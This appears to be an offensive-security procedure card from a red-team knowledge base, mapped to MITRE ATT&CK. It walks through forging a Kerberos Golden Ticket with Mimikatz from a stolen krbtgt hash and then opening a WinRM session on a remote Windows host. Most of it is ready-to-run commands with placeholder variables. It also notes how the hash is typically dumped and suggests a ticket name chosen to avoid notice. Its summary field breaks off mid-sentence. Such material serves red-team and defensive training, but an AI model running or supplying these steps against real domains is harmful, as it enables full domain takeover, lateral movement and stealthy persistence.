---
id: c4dc0059-3ea5-444f-876f-43bf7d5ef01e
name: Create a Golden Ticket and Launch a Windows Shell (Windows)
type: procedure
verified: false
submitted: false
created_at: '2020-07-07T04:30:50.362471+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Pass the Ticket|T1097 - Pass the Ticket]]'
platforms:
- Windows
tags:
- '[[Active Directory]]'
- '[[NTLM]]'
- '[[persistence]]'
- '[[powershell]]'
commands:
- '[[Get-ADDomain Get Domain Information from Active Directory]]'
- '[[Mimikatz Create a Golden Ticket with the krbtgt hash]]'
- '[[PSSession Spawn a WinRM Session on a Remote System]]'
---

# Create a Golden Ticket and Launch a Windows Shell (Windows)

## Summary

Use the domain's krbtgt NTLM hash from a domain controller to create a Golden Ticket, then use it to spawn a WinRM Session on a remote system. The krbtgt hash is generally obtained by gaining Administrator rights on a domain controller and dumping the hash via DCSync (Mimikatz, secretsdump),  LSA (

## Description

# Description

Use the domain's krbtgt NTLM hash from a domain controller to create a Golden Ticket, then use it to spawn a WinRM Session on a remote system. The krbtgt hash is generally obtained by gaining Administrator rights on a domain controller and dumping the hash via DCSync (Mimikatz, secretsdump),  LSA (Mimikatz), or Hashdump (Meterpreter).

# Instructions

1. Get the Domain SID

**Command** ([[Get-ADDomain Get Domain Information from Active Directory]]):

```bash
Get-ADDomain -Identity $_DOMAIN
```

2. Create a Golden ticket for the Administrator user. The name itself doesn't matter, but "Administrator" stands out less than "hackerman"

**Command** ([[Mimikatz Create a Golden Ticket with the krbtgt hash]]):

```bash
Mimikatz.exe "kerberos::golden /domain:$_DOMAIN /sid:$_DOMAIN_SID /rc4:$_NTLM_HASH /user:Administrator /ptt" "exit"
```

3. Spawn a WinRM session on a remote system with a Golden Ticket in memory

**Command** ([[PSSession Spawn a WinRM Session on a Remote System]]):

```bash
Enter-PSSession -$_TARGET
```

Note: other tools such as PsExec can also be used instead of WinRM.

## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Pass the Ticket|T1097 - Pass the Ticket]]

## Commands Used

- [[Get-ADDomain Get Domain Information from Active Directory]]
- [[Mimikatz Create a Golden Ticket with the krbtgt hash]]
- [[PSSession Spawn a WinRM Session on a Remote System]]

## Tags

- [[Active Directory]]
- [[NTLM]]
- [[persistence]]
- [[powershell]]
